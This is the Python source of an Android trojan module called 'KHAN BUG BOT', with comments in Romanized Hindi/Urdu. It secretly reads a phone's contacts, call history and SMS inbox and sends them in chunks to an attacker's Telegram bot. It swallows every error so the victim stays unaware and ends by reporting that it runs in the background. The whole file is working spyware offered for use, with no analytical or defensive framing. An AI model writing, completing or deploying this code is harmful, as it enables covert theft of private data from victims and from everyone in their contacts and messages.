"""
KHAN BUG BOT - Trojan Module
Chupke se victim ka data nikal kar Telegram par bhejta hai.
(Contacts, Call Logs, SMS)
"""

import time

import requests
from jnius import autoclass

# Android classes load karna
ContactsContract = autoclass('android.provider.ContactsContract$CommonDataKinds$Phone')
CallLog = autoclass('android.provider.CallLog$Calls')
Sms = autoclass('android.provider.Telephony$Sms')
Activity = autoclass('org.kivy.android.PythonActivity').mActivity


# ------------------------------------------------------------------ #
# TELEGRAM BHEJNE WALA FUNCTION
# ------------------------------------------------------------------ #
def send_telegram(token, chat_id, title, text):
    """Telegram par message bhejta hai. Fail ho to chup rehta hai."""
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    try:
        requests.post(url, json={
            "chat_id": chat_id,
            "text": f"🐞 KHAN BUG BOT | {title}\n\n{text}"
        }, timeout=15)
    except Exception:
        pass  # kuch bhi ho, user ko pata nahi chale


# ------------------------------------------------------------------ #
# CONTACTS NIKALNA
# ------------------------------------------------------------------ #
def get_contacts():
    """Phone ke saare contacts nikalta hai."""
    cr = Activity.getContentResolver()
    cursor = cr.query(ContactsContract.CONTENT_URI, None, None, None, None)
    lines = []
    while cursor.moveToNext():
        name = cursor.getString(
            cursor.getColumnIndex(ContactsContract.DISPLAY_NAME))
        number = cursor.getString(
            cursor.getColumnIndex(ContactsContract.NUMBER))
        lines.append(f"{name} : {number}")
    cursor.close()
    return lines


# ------------------------------------------------------------------ #
# CALL LOGS NIKALNA
# ------------------------------------------------------------------ #
def get_call_logs():
    """Call history nikalta hai (max 150 calls)."""
    cr = Activity.getContentResolver()
    cursor = cr.query(CallLog.CONTENT_URI, None, None, None,
                      CallLog.DATE + " DESC")
    types = {1: "IN", 2: "OUT", 3: "MISS"}
    lines = []
    while cursor.moveToNext():
        number = cursor.getString(cursor.getColumnIndex(CallLog.NUMBER))
        ctype = types.get(
            cursor.getInt(cursor.getColumnIndex(CallLog.TYPE)), "?")
        date = cursor.getString(cursor.getColumnIndex(CallLog.DATE))
        lines.append(f"[{ctype}] {number} ({date})")
        if len(lines) >= 150:
            break
    cursor.close()
    return lines


# ------------------------------------------------------------------ #
# SMS NIKALNA
# ------------------------------------------------------------------ #
def get_sms():
    """Inbox messages nikalta hai (max 150 SMS)."""
    cr = Activity.getContentResolver()
    cursor = cr.query(Sms.CONTENT_URI, None, None, None, "date DESC")
    lines = []
    while cursor.moveToNext():
        address = cursor.getString(cursor.getColumnIndex("address"))
        body = cursor.getString(cursor.getColumnIndex("body"))
        lines.append(f"From: {address} | {body[:100]}")
        if len(lines) >= 150:
            break
    cursor.close()
    return lines


# ------------------------------------------------------------------ #
# MAIN TROJAN — SAB DATA CHUPKE BHEJNA
# ------------------------------------------------------------------ #
def steal_all(token, chat_id, delay_between=2):
    """
    Contacts, Call Logs aur SMS — sab chupke se Telegram par bhejta hai.
    Data ko chhote chunks mein baant kar bhejta hai (Telegram ki limit
    4096 characters hai is liye).
    """
    jobs = [
        ("CONTACTS", get_contacts),
        ("CALL LOGS", get_call_logs),
        ("SMS", get_sms),
    ]

    for title, fetcher in jobs:
        try:
            data = fetcher()
        except Exception as exc:
            try:
                send_telegram(token, chat_id, f"{title} ERROR", str(exc))
            except Exception:
                pass
            time.sleep(delay_between)
            continue

        # Data ko 3500-character chunks mein todna
        chunks = []
        current = []
        size = 0
        for line in data:
            current.append(line)
            size += len(line)
            if size > 3500:
                chunks.append("\n".join(current))
                current = []
                size = 0
        if current:
            chunks.append("\n".join(current))

        # Har chunk Telegram par bhejna
        if chunks:
            for i, chunk in enumerate(chunks):
                send_telegram(token, chat_id,
                              f"{title} ({i + 1}/{len(chunks)}) total={len(data)}",
                              chunk)
                time.sleep(delay_between)
        else:
            send_telegram(token, chat_id, title, "(No data found)")

        time.sleep(delay_between)

    # Aakhri status message
    send_telegram(token, chat_id, "STATUS",
                  "KHAN BUG BOT installed and running in background. ✅")
